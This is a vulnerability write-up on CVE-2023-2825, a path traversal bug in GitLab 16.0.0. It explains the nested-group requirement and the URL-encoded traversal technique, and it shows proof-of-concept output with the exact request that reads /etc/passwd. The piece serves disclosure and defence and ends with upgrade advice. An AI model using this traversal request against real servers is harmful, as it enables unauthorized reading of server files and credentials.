# CVE-2023-2825 - GitLab CE/EE 16.0.0 Arbitrary File Read via Path Traversal

On May 23, 2023 GitLab released version 16.0.1 which fixed a critical vulnerability, CVE-2023-2825, affecting the Community Edition (CE) and Enterprise Edition (EE) version 16.0.0. The vulnerability allows unauthenticated users to read arbitrary files through a path traversal bug. It was discovered by pwnie on HackerOne through the bug bounty program.

At the time of writing, there was no public proof of concept available

## GitLab Advisory

An unauthenticated malicious user can use a path traversal vulnerability to read arbitrary files on the server when an attachment exists in a public project nested within at least five groups. This is a critical severity issue (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N, 10.0).

## Sub Groups

This vulnerability has an interesting requirement where the project needs to be nested in at least 5 groups. In our testing, we found a direct correlation with the amount of groups and the directories you can traverse. The rule seems to be N + 1, meaning if you wish to traverse 10 directories you need to have 11 groups.

On a standard Gitlab install, file attachments are uploaded to `/var/opt/gitlab/gitlab-rails/uploads/@hashed/<a>/<b>/<secret>/<secret>/<file>`. So if you want to reach the filesystem root, you must go back 10 directories and therefore you need 11 groups.

## File Upload & Path Traversal

When you upload a file as an attachment on a GitLab issue, a request is sent to `POST - /:repo/upload`. This returns a JSON response with the file URL, allowing you to access the file.

The file URL is composed of `/:repo/uploads/:id/:file` where `:file` is the file name itself. Replacing `:file` with any file path will cause GitLab to return the requested file. GitLab fails to sanitize this file path, leading to path traversal.

To successfully exploit this vulnerability, you must URL encode the `/` in the file path. GitLab will read this as a value and decode it internally. Failing to encode it will lead to GitLab interpreting the `/` in the file path as part of the route.

In our testing, encoding just the `/` was enough to bypass Nginx path errors.

## Authentication

Unauthenticated users can only exploit this vulnerability on public repositories matching the nested group requirements. Authentication is required to access the repository itself.

## Proof of Concept

We developed the proof of concept in Python. It creates the 11 groups, creates a public repo, uploads a file, and then exploits the vulnerability to get the file `/etc/passwd`.

### Output

```bash
$ python3 poc.py
[*] Attempting to login...
[*] Login successful as user 'root'
[*] Creating 11 groups with prefix UJB
[*] Created group 'UJB-1'
[*] Created group 'UJB-2'
[*] Created group 'UJB-3'
[*] Created group 'UJB-4'
[*] Created group 'UJB-5'
[*] Created group 'UJB-6'
[*] Created group 'UJB-7'
[*] Created group 'UJB-8'
[*] Created group 'UJB-9'
[*] Created group 'UJB-10'
[*] Created group 'UJB-11'
[*] Created public repo 'UJB-1/UJB-2/UJB-3/UJB-4/UJB-5/UJB-6/UJB-7/UJB-8/UJB-9/UJB-10/UJB-11//CVE-2023-2825'
[*] Uploaded file '/uploads/74b16af4b9048e13c4311484bbfd3b76/file'
[*] Executing exploit, fetching file '/etc/passwd': GET - /UJB-1/UJB-2/UJB-3/UJB-4/UJB-5/UJB-6/UJB-7/UJB-8/UJB-9/UJB-10/UJB-11//CVE-2023-2825/uploads/74b16af4b9048e13c4311484bbfd3b76//..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh

```

## Recommendation Actions
GitLab recommend upgrading all versions affected by this issue as soon as possible.

## References
https://about.gitlab.com/releases/2023/05/23/critical-security-release-gitlab-16-0-1-released/

https://occamsec.com/exploit-for-cve-2023-2825/
